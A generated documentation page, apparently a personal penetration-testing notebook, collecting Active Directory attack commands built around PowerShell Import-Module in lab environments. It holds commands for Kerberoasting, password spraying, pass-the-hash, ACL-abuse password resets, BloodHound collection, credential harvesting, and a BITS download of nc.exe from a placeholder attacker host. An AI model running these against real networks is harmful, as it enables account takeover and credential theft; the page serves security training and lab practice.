@@ -1,0 +1,445 @@
+---
+title: "Import-Module"
+sidebarTitle: "Import-Module"
+description: "Commands and examples collected from your Import-Module notes."
+keywords: ["Import-Module", "Get-Module", "Get-Command"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/powershell-modules.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=powershell-modules) · [All tools](/index)
+
+## Import PowerView and Enumerate SPN Users
+
+**Notebook example**
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+23 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="Changing the User&#x27;s Password">
+
+### Changing the User's Password
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+</Accordion>
+
+<Accordion title="Using Find-InterestingDomainAcl">
+
+### Using Find-InterestingDomainAcl
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+```
+
+</Accordion>
+
+<Accordion title="List trusts from the current domain">
+
+### List trusts from the current domain
+
+**AD Lab Guide — Full Reference**
+
+```powershell
+Import-Module ActiveDirectory
+Get-ADTrust -Filter * | Select-Object Source,Target,Direction,TrustType,ForestTransitive
+```
+
+</Accordion>
+
+<Accordion title="Internal Password Spraying - from Windows">
+
+### Internal Password Spraying - from Windows
+
+**Active Directory Password Spraying**
+
+```powershell
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+</Accordion>
+
+<Accordion title="A. SharpHound on the Windows host">
+
+### A. SharpHound on the Windows host
+
+**BloodHound: Full Reference**
+
+```cmd
+:: .exe
+.\SharpHound.exe -c All --zipfilename loot
+:: alternate collection example (not a guarantee of reduced logging):
+.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Temp
+:: PowerShell version
+powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"
+```
+
+</Accordion>
+
+<Accordion title="Using Get-ADTrust">
+
+### Using Get-ADTrust
+
+**Domain Trusts Primer**
+
+```powershell
+PS C:\htb> Import-Module activedirectory
+PS C:\htb> Get-ADTrust -Filter *
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : False
+IntraForest             : True
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 32
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : True
+IntraForest             : False
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : FREIGHTLOGISTICS.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : FREIGHTLOGISTICS.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 8
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+```
+
+</Accordion>
+
+<Accordion title="Windows LOLBins">
+
+### Windows LOLBins
+
+**File Transfers for Linux and Windows**
+
+```powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+</Accordion>
+
+<Accordion title="Windows — AES Encryption (PowerShell)">
+
+### Windows — AES Encryption (PowerShell)
+
+**File Transfers for Linux and Windows**
+
+```powershell
+# Import the encryption module
+Import-Module .\Invoke-AESEncryption.ps1
+
+# Encrypt a file (creates file.aes)
+Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+
+# Decrypt a file
+Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
+
+# Encrypt a string
+Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Text "Secret Text"
+```
+
+**File Transfers for Linux and Windows**
+
+Context from the notebook: Download the script first, then  Import-Module  before use
+
+```text
+Import-Module
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```powershell
+# Bypass execution policy restrictions
+Set-ExecutionPolicy -Scope Process Bypass
+
+# Import module that exists in the current directory
+Import-Module .\PowerHuntShares.psm1
+```
+
+</Accordion>
+
+<Accordion title="Windows — GroupPolicy module">
+
+### Windows — GroupPolicy module
+
+**GPO scope and permissions**
+
+```powershell
+Import-Module GroupPolicy
+Get-GPO -All | Select-Object DisplayName,Id,GpoStatus
+Get-GPPermission -Name 'GPO_NAME' -All
+Get-GPOReport -Name 'GPO_NAME' -ReportType Html -Path .\gpo-report.html
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Workaround #1: PSCredential Object">
+
+### Workaround #1: PSCredential Object
+
+**Kerberos Double Hop**
+
+```shellsession
+*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
+
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+</Accordion>
+
+<Accordion title="Workaround #2: Register PSSession Configuration">
+
+### Workaround #2: Register PSSession Configuration
+
+**Kerberos Double Hop**
+
+```powershell
+[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
+[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
+
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+   + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+</Accordion>
+
+<Accordion title="Enumerating for MS-PRN Printer Bug">
+
+### Enumerating for MS-PRN Printer Bug
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Import-Module .\SecurityAssessment.ps1
+PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+ComputerName                        Status
+------------                        ------
+ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
+```
+
+</Accordion>
+
+<Accordion title="Windows — Invoke-TheHash (PowerShell)">
+
+### Windows — Invoke-TheHash (PowerShell)
+
+**Pass the Hash from Linux and Windows**
+
+```powershell
+PS C:\> cd C:\tools\Invoke-TheHash\
+PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+```
+
+</Accordion>
+
+<Accordion title="PowerView — Load and Enumerate">
+
+### PowerView — Load and Enumerate
+
+**PowerView — Load and Enumerate**
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-DomainUser
+Get-DomainUser -Identity YOUR_USERNAME
+```
+
+</Accordion>
+
+<Accordion title="Enumerating MSSQL Instances with PowerUpSQL">
+
+### Enumerating MSSQL Instances with PowerUpSQL
+
+**Privileged Remote Access**
+
+```powershell
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+
+ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
+Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400
+DomainAccount    : damundsen
+DomainAccountCn  : Dana Amundsen
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
+LastLogon        : 4/6/2022 11:59 AM
+```
+
+</Accordion>
+
+<Accordion title="Passwords stored in services">
+
+### Passwords stored in services
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
+Import-Module path\to\SessionGopher.ps1;
+Invoke-SessionGopher -AllDomain -o
+Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
+
+</Accordion>
+
+<Accordion title="Search for file contents">
+
+### Search for file contents
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# First, retrieve a token
+## Method 1: using SnaffPoint binary
+$token = (.\GetBearerToken.exe https://your.sharepoint.com)
+## Method 2: using AADInternals
+Install-Module AADInternals -Scope CurrentUser
+Import-Module AADInternals
+$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")
+
+# Second, search on Sharepoint
+## Method 1: using search strings in ./presets dir
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
+## Method 2: using search string in command line
+### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
+```
+
+</Accordion>
+
+<Accordion title="ActiveDirectory PowerShell Module">
+
+### ActiveDirectory PowerShell Module
+
+**Active Directory Enumeration from Windows**
+
+```text
+Get-Module
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+Import-Module ActiveDirectory
+```
+
+</Accordion>
+
+<Accordion title="PowerView / SharpView">
+
+### PowerView / SharpView
+
+**Active Directory Enumeration from Windows**
+
+```text
+Import-Module .\PowerView.ps1
+```
+
+</Accordion>
+
+</AccordionGroup>
